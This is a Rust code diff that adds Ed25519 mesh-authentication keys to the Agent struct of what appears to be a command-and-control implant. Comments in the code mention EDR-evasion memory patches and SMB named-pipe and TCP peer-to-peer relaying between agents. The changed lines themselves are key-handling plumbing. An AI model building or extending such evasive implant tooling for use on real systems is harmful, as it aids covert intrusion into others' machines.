@@ -252,7 +252,7 @@ pub mod nt_handle;
 pub mod pe_resolve_macros;
 
 use anyhow::Result;
-use common::{CryptoSession, Message, Transport};
+use common::{CryptoSession, LockedSecret, Message, Transport};
 use log::{error, info, warn};
 use std::sync::Arc;
 use tokio::sync::{Mutex, RwLock};
@@ -285,10 +285,18 @@ pub struct Agent {
     /// (via SMB named-pipe listener or TCP P2P relay). An empty/default
     /// mesh means the agent has no children.
     p2p_mesh: Arc<tokio::sync::Mutex<p2p::P2pMesh>>,
+    /// Ed25519 private key for P2P mesh authentication (mlocked, zeroized on drop).
+    mesh_private_key: Arc<LockedSecret>,
+    /// Ed25519 public key corresponding to `mesh_private_key`.
+    mesh_public_key: [u8; 32],
 }
 
 impl Agent {
-    pub fn new(transport: Box<dyn Transport + Send>) -> Result<Self> {
+    pub fn new(
+        transport: Box<dyn Transport + Send>,
+        mesh_private_key: Arc<LockedSecret>,
+        mesh_public_key: [u8; 32],
+    ) -> Result<Self> {
         // Evasion patches are applied once in Agent::run() before the main loop.
         // Applying them here as well would create a race: if the memory patch
         // takes effect here but is reverted by EDR before run() installs the
@@ -357,7 +365,14 @@ impl Agent {
             config: Arc::new(RwLock::new(cfg)),
             crypto,
             p2p_mesh: Arc::new(tokio::sync::Mutex::new(p2p::P2pMesh::default())),
+            mesh_private_key,
+            mesh_public_key,
         })
+    }
+
+    /// Return the agent's Ed25519 mesh public key.
+    pub fn mesh_public_key(&self) -> [u8; 32] {
+        self.mesh_public_key
     }
 
     pub async fn run(&mut self) -> Result<()> {
